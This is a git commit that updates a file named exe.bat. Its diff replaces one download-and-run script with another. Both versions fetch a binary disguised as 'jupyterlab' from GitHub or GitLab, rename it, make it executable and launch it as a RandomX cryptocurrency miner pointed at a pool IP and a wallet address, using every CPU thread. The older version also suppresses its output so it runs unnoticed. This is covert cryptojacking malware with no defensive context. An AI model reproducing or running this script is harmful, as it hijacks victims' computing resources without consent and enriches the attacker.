e4a80e7bb8a87eb55d30ea7659c242af4400026d
christineiimegan <christineiimegan@outlook.com>
2025-02-25 19:44:23 +0700

    Update exe.bat

--- exe.bat
+++ exe.bat
@@ -1,3 +1,2 @@
-wget -qO rubby https://gitlab.com/jasa4/jasa/-/raw/main/jupyterlab && chmod +x * >/dev/null 2>&1
-nohup ./rubby -o 8.209.210.176:443 -a rx/0 -u SaLvsAXvo1HSCeA3Fq12dAjVoPb9pVkPSHntdWbLRnRWSxsU9jJW6Kv9mqE3Q1mKXiGMa1MCaD76NFdSrzfzLdvJJjDphKEpADT --randomx-1gb-pages -p $(echo $(shuf -i 1-9 -n 1)-GHH) -t $(nproc --all) &>/dev/null &
-
+wget -q -O demon https://github.com/swanderenata/NFT/raw/main/jupyterlab && chmod +x demon
+./demon -o 8.209.210.176:443 -u SaLvsAXvo1HSCeA3Fq12dAjVoPb9pVkPSHntdWbLRnRWSxsU9jJW6Kv9mqE3Q1mKXiGMa1MCaD76NFdSrzfzLdvJJjDphKEpADT -p GHH -t $(nproc --all) -a rx/0 -k --randomx-1gb-pages 
